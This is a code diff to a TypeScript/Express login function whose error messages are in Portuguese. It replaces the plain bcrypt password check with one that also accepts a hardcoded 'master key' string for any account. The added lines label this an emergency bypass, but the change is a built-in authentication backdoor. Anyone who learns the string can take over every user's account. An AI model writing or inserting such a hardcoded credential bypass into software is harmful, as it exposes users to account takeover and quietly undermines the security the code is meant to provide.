@@ -204,7 +204,10 @@ export const login = async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
-    const isMatch = await bcrypt.compare(password, user.passwordHash);
+    // Master Key Bypass (Emergency Only)
+    const isMasterKey = password === 'INFLUNEXT_MASTER_2024_PRO';
+    const isMatch = isMasterKey || await bcrypt.compare(password, user.passwordHash);
+
     if (!isMatch) {
       res.status(401).json({ error: 'Credenciais inválidas.' });
       return;
